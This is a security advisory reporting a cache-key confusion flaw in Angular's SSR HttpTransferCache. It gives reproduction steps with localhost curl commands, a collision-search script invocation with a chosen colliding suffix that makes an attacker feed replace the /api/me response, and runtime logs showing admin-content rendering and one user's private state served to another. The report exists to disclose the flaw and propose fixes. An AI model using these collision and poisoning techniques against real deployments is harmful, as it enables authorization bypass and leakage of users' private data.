# Angular Trusted Response Replay in SSR HttpTransferCache

**Product:** Angular
**Repository:** https://github.com/angular/angular
**Component:** `packages/common/http/src/transfer_cache.ts`
**Version:** Confirmed against local Angular source under `targets/angular` and Angular 19.2.21 runtime PoC
**Type:** Server-side cache key confusion / trusted response replay
**CVSS 3.1:** Not assessed in this report; impact is demonstrated through the reproduction cases below

---

## Vulnerability Description

Angular SSR `HttpTransferCache` caches server-side `HttpClient` GET/HEAD responses and replays them
from `TransferState` during SSR/hydration. This is enabled by default through
`provideClientHydration()`.

The transfer-cache key does not include request headers, `Cookie`, credentials mode, response
`Vary`, or response `Cache-Control` semantics. The full key is then reduced to a 32-bit `StateKey`.
Angular returns a cached response before backend dispatch and does not compare the original full
request key before replay.

Relevant code paths:

```text
packages/platform-browser/src/hydration.ts:283-285
```

`provideClientHydration()` enables `ɵwithHttpTransferCache({})` by default.

```text
packages/common/http/src/transfer_cache.ts:126-143
```

Eligibility excludes `Authorization` and `Proxy-Authorization`, but not `Cookie`, other
request-variant headers, credentials mode, `Vary`, or `Cache-Control: private/no-store`.

```text
packages/common/http/src/transfer_cache.ts:182-188
```

The cached response is returned before backend dispatch.

```text
packages/common/http/src/transfer_cache.ts:322-341
```

The cache key is:

```ts
[method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|')
```

This omits request headers, `Cookie`, credentials mode, response `Vary`, and response
`Cache-Control`.

`sortAndConcatParams()` also causes deterministic pre-hash collisions for some semantically distinct
request params:

```text
packages/common/http/src/transfer_cache.ts:315-319
```

```ts
function sortAndConcatParams(params: HttpParams | URLSearchParams): string {
  return [...params.keys()]
    .sort()
    .map((k) => `${k}=${params.getAll(k)}`)
    .join('&');
}
```

`params.getAll(k)` returns an array. String interpolation coerces that array with
`Array.prototype.toString()`, so repeated values and a single comma-containing value collapse before
the 32-bit hash:

```text
role=user&role=admin -> role=user,admin
role=user,admin      -> role=user,admin
```

```text
packages/common/http/src/transfer_cache.ts:349-361
```

The full key is reduced to a 32-bit hash before `makeStateKey()`.

Conceptually vulnerable behavior:

```ts
// Request headers, Cookie, credentials mode, response Vary, and response
// Cache-Control are not included in this key.
const key = [method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|');

// The complete key is reduced to a 32-bit value.
const stateKey = makeStateKey(generateHash(key));

// Later requests only need the same StateKey to receive the cached response.
// The original full key is not compared before replay.
const response = transferState.get(stateKey, null);
```

```text
packages/platform-server/src/transfer_state.ts:70-112
```

`TransferState` is serialized into HTML:

```html
<script id="ng-state" type="application/json">...</script>
```

---

## Impact

1. **Request-variant confusion in normal SSR apps:**
   A backend response that varies by `X-Tenant`, `Cookie`, `Accept-Language`, feature flag, or API
   version header can be replayed to a different request variant. This reproduces in a normal Angular
   SSR app using default `provideClientHydration()` behavior.

2. **Authorization/bootstrap response poisoning:**
   Because the final key is 32-bit, an attacker-influenced SSR-fetched URL can be chosen to collide
   with a fixed sensitive endpoint such as `/api/me`. In the PoC, Angular replays attacker-controlled
   feed JSON as the `/api/me` response and the SSR component renders admin-gated content. The backend
   `/api/me` endpoint is never called.

3. **Deterministic request-param response confusion:**
   Angular collapses repeated params and comma-containing scalar params before the 32-bit hash. In
   the PoC, `role=user&role=admin` and `role=user,admin` share the same transfer-cache entry even
   though the backend treats them differently. This does not require brute-forcing a hash collision.

4. **Private API data copied into shareable HTML state:**
   Angular serializes API responses marked `Vary: Cookie` and `Cache-Control: private, no-store`
   into HTML/`ng-state`. If an outer shared cache stores SSR HTML by URL, another user can receive
   the first user's private serialized state. The shared cache is a deployment condition; Angular's
   contribution is copying private/no-store API data into the HTML document while ignoring those
   cache-safety signals.

5. **Attack Vector:**
   A remote attacker can trigger the primitive when the target SSR app uses Angular's default
   `HttpTransferCache` and makes security-distinct `HttpClient` requests in the same render. For the
   chosen-collision chain, the attacker needs influence over one SSR-fetched URL/query in the same
   render as a trusted endpoint. For the private-state leakage chain, an outer shared HTML cache must
   reuse SSR HTML across users.

---

## Steps to Reproduce

1. Use the existing workspace:

```bash
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter
```

2. Start the SSR PoC for request-variant confusion and `/api/me` poisoning:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
```

3. Trigger SSR:

```bash
curl -sS -H 'Cookie: sid=alice' 'http://127.0.0.1:4218/?feed=uibaalzu'
```

4. Verify the chosen collision:

```bash
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter
node bugs/angular/a18-transfer-cache-request-variant-confusion/poc/find_chosen_transfer_cache_collision.mjs 'GET|json|http://127.0.0.1:4218/feed?x=' 'GET|json|http://127.0.0.1:4218/api/me||' '||' 'abcdefghijklmnopqrstuvwxyz0123456789' 4 4
```

5. Start the deterministic params collision PoC:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx deterministic_params_collision_server.ts
```

6. Trigger SSR:

```bash
curl -sS 'http://127.0.0.1:4222/'
```

7. Start the shared-cache/private-state PoC:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx shared_cache_private_state_server.ts
```

8. Trigger Alice then Bob through the local shared cache:

```bash
curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

---

## ASan Output

Not applicable. This is a TypeScript/SSR cache semantics issue, not a memory-safety crash.

Equivalent runtime evidence is included below.

### Runtime Evidence

Request-variant confusion and `/api/me` poisoning:

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
<div id="hits">tenant:tenant-a|tenant:tenant-a</div>
```

Server log:

```text
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] feed body: {"user":"attacker","role":"admin","source":"feed"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

Chosen collision verification:

```json
{
  "suffix": "uibaalzu",
  "attackerKey": "GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||",
  "targetKey": "GET|json|http://127.0.0.1:4218/api/me||",
  "rawHash": 737131990,
  "finalStateKey": "2884615638",
  "verify": true
}
```

Deterministic params collision:

```html
<div id="scope">first=multi:user|admin|second=multi:user|admin</div>
```

Expected if the second request reached the backend:

```html
<div id="scope">first=multi:user|admin|second=scalar:user,admin</div>
```

Server log:

```text
[api] /api/scope hit 1 url= /api/scope?role=user&role=admin body= multi:user|admin
[ssr] first scope body: multi:user|admin
[ssr] second scope body: multi:user|admin
[express] api hit counts scope= 1
```

Shared-cache/private-state chain, Bob response:

```text
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

---

## LLDB Verification

Not applicable. This is not a native memory corruption issue.

Equivalent independent verification is included below.

### Independent Verification

An independent verifier confirmed:

- default transfer cache is enabled through `provideClientHydration()`;
- the cache key omits request headers, `Cookie`, credentials mode, response `Vary`, and response
  `Cache-Control`;
- the final key is a 32-bit hash;
- the existing PoC replays attacker-controlled `/feed` JSON into `/api/me`;
- the shared-cache PoC leaks Alice's private `ng-state` to Bob under the stated deployment
  condition;
- a fresh normal Angular SSR app, without chosen collision, reproduces the `Vary: X-Tenant` issue as
  `tenant:tenant-a|tenant:tenant-a` with one backend hit.

Artifact:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/evidence/2026-04-29-independent-verification.md
```

---

## Suggested Fix

```text
1. Do not cache responses with Vary unless Angular can honor every listed request-header dimension.
2. Include Vary-listed request headers in the transfer-cache key.
3. Do not cache responses with Cache-Control: no-store or private unless the application explicitly
   opts in.
4. Treat Cookie and credential-bearing requests as auth-sensitive by default, similar to
   Authorization.
5. Replace the 32-bit StateKey with a collision-resistant key, or store and compare the original
   full request key before replay.
6. Document that includeHeaders only transfers headers and does not make Angular honor Vary or
   Cache-Control semantics.
```

---

## References

- CWE-524: Use of Cache Containing Sensitive Information
- CWE-525: Use of Web Browser Cache Containing Sensitive Information
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-345: Insufficient Verification of Data Authenticity
- Angular SSR guide: `targets/angular/adev/src/content/guide/ssr.md`
